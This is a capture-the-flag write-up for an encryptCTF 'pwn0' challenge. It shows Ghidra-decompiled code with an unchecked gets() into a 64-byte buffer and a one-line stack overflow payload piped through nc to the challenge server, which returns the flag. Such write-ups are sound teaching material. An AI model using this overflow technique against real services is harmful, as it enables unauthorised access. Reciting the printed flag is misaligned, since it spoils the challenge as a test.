# pwn0
Pwn

## Challenge 
How's the josh?

nc 104.154.106.182 1234

author: codacker

## Solution

Decompile in Ghidra

	undefined4 main(void)
	{
	  int iVar1;
	  char local_54 [64];
	  undefined local_14 [16];
	  
	  setvbuf(stdout,(char *)0x0,2,0);
	  puts("How\'s the josh?");
	  gets(local_54);
	  iVar1 = memcmp(local_14,&DAT_0804862d,4); // "H!gh"
	  if (iVar1 == 0) {
	    puts("Good! here\'s the flag");
	    print_flag();
	  }
	  else {
	    puts("Your josh is low!\nBye!");
	  }
	  return 0;
	}

We see that we must make the string, local_14 == "H!gh"

It occurs after a 64 byte buffer

	$ python3 -c 'print("A" * 64 + "H!gh")' 
	| nc 104.154.106.182 1234
	How's the josh?
	Good! here's the flag
	encryptCTF{L3t5_R4!53_7h3_J05H}

## Flag

	encryptCTF{L3t5_R4!53_7h3_J05H}
